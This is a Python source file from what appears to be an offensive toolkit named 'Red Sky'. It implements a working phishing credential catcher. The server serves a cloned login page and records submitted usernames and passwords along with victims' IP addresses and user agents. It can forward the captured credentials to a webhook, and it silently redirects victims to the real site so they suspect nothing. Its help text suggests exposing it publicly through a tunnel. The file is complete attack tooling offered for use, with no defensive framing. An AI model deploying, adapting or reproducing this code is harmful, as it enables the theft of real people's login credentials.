# language: Python, file: Program/phish/catcher.py, target: Red Sky phish — catcher
# HTTP catcher. Serves a cloned template, logs submitted credentials, redirects
# to the real site afterward so nothing looks wrong.

import http.server
import json
import socketserver
import sys
import threading
import time
from pathlib import Path
from typing import Dict, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


LOG_DIR = OUTPUT_DIR / "phish" / "hits"


class CatcherHandler(http.server.BaseHTTPRequestHandler):
    template_dir: Optional[Path] = None
    redirect_url: str = "https://www.google.com"
    webhook_url: str = ""

    def log_message(self, fmt, *args):
        pass

    def _client_ip(self) -> str:
        xff = self.headers.get("X-Forwarded-For", "")
        if xff:
            return xff.split(",")[0].strip()
        return self.client_address[0]

    def _serve_static(self, path: str):
        """Serve the template directory contents."""
        if not self.template_dir:
            self.send_error(404)
            return
        # sanitize
        rel = path.lstrip("/") or "index.html"
        if ".." in rel:
            self.send_error(400)
            return
        f = self.template_dir / rel
        if f.is_file():
            ext = f.suffix.lower()
            ct = {
                ".html": "text/html; charset=utf-8",
                ".htm":  "text/html; charset=utf-8",
                ".css":  "text/css",
                ".js":   "application/javascript",
                ".png":  "image/png",
                ".jpg":  "image/jpeg",
                ".jpeg": "image/jpeg",
                ".svg":  "image/svg+xml",
                ".ico":  "image/x-icon",
                ".woff": "font/woff",
                ".woff2":"font/woff2",
            }.get(ext, "application/octet-stream")
            data = f.read_bytes()
            self.send_response(200)
            self.send_header("Content-Type", ct)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        else:
            # serve index.html for any unknown path (SPA route)
            idx = self.template_dir / "index.html"
            if idx.exists():
                data = idx.read_bytes()
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_error(404)

    def _log_creds(self, creds: Dict):
        ip = self._client_ip()
        ua = self.headers.get("User-Agent", "")
        ts = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

        entry = {
            "ts": ts,
            "ip": ip,
            "ua": ua,
            "creds": creds,
        }

        LOG_DIR.mkdir(parents=True, exist_ok=True)
        with (LOG_DIR / "creds.jsonl").open("a") as f:
            f.write(json.dumps(entry) + "\n")

        print()
        print(f"{SCARLET}{BOLD}▓ CREDS{RESET}  {ASH}{ts}{RESET}")
        print(f"  {ARTERY}ip{RESET}   {BONE}{ip}{RESET}")
        for k, v in creds.items():
            print(f"  {ARTERY}{k:<6}{RESET}{BONE}{v}{RESET}")
        print()

        if self.webhook_url:
            try:
                import requests
                requests.post(self.webhook_url, json={
                    "content": f"**Phish hit** — `{ip}`\n```\n{json.dumps(creds, indent=2)}\n```",
                }, timeout=5)
            except Exception:
                pass

    def do_GET(self):
        self._serve_static(self.path)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0") or 0)
        body = b""
        if length > 0:
            body = self.rfile.read(min(length, 65536))

        creds = {}
        # parse form-encoded
        ct = self.headers.get("Content-Type", "")
        if "application/x-www-form-urlencoded" in ct:
            from urllib.parse import parse_qs
            try:
                parsed = parse_qs(body.decode("utf-8", errors="replace"))
                creds = {k: (v[0] if v else "") for k, v in parsed.items()}
            except Exception:
                pass
        elif "application/json" in ct:
            try:
                creds = json.loads(body.decode("utf-8", errors="replace"))
            except Exception:
                pass
        else:
            # raw body — save as-is
            creds = {"raw": body.decode("utf-8", errors="replace")[:500]}

        if creds:
            self._log_creds(creds)

        # redirect to the real site
        self.send_response(302)
        self.send_header("Location", self.redirect_url)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.end_headers()


def _show_hits():
    log = LOG_DIR / "creds.jsonl"
    if not log.exists():
        print_warn("no hits yet")
        return
    for line in log.read_text().splitlines():
        try:
            e = json.loads(line)
        except json.JSONDecodeError:
            continue
        print(f"  {ARTERY}▓{RESET} {ASH}{e['ts']}{RESET}  {BONE}{e['ip']:<16}{RESET}")
        for k, v in e.get("creds", {}).items():
            print(f"      {k}: {v}")


def cmd_serve(port: int, template: str, redirect: str, webhook: str) -> int:
    td = Path(template).expanduser().resolve()
    if not td.exists() or not td.is_dir():
        print_err(f"template dir not found: {td}")
        return 1

    CatcherHandler.template_dir = td
    CatcherHandler.redirect_url = redirect
    CatcherHandler.webhook_url = webhook

    print_info(f"phish catcher on 0.0.0.0:{port}")
    print_kv("template", td)
    print_kv("redirect", redirect)
    if webhook:
        print_kv("webhook", webhook[:60])
    print_kv("log", LOG_DIR / "creds.jsonl")
    print()
    print_info("for a public URL: cloudflared tunnel --url http://localhost:{port}")
    print_info("CTRL+C to stop")

    with socketserver.ThreadingTCPServer(("0.0.0.0", port), CatcherHandler) as httpd:
        httpd.allow_reuse_address = True
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print()
            print_info("stopped")
    return 0


def run_cli(args: List[str]) -> int:
    import argparse
    p = argparse.ArgumentParser(prog="redsky phish catcher", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--template", default="")
    p.add_argument("--redirect", default="https://www.google.com")
    p.add_argument("--webhook", default="")
    p.add_argument("action", nargs="?", default="serve")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky phish catcher [serve|hits] --template <dir> [--port N] [--redirect URL]")
        return 2

    if ns.help:
        print_info("redsky phish catcher serve --template <dir> [--port 8080] [--redirect URL] [--webhook URL]")
        print_info("redsky phish catcher hits")
        return 0

    if ns.action == "hits":
        _show_hits()
        return 0

    if not ns.template:
        print_err("--template required (run 'redsky phish templates clone <preset> <catcher_url>' first)")
        return 2

    return cmd_serve(ns.port, ns.template, ns.redirect, ns.webhook)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
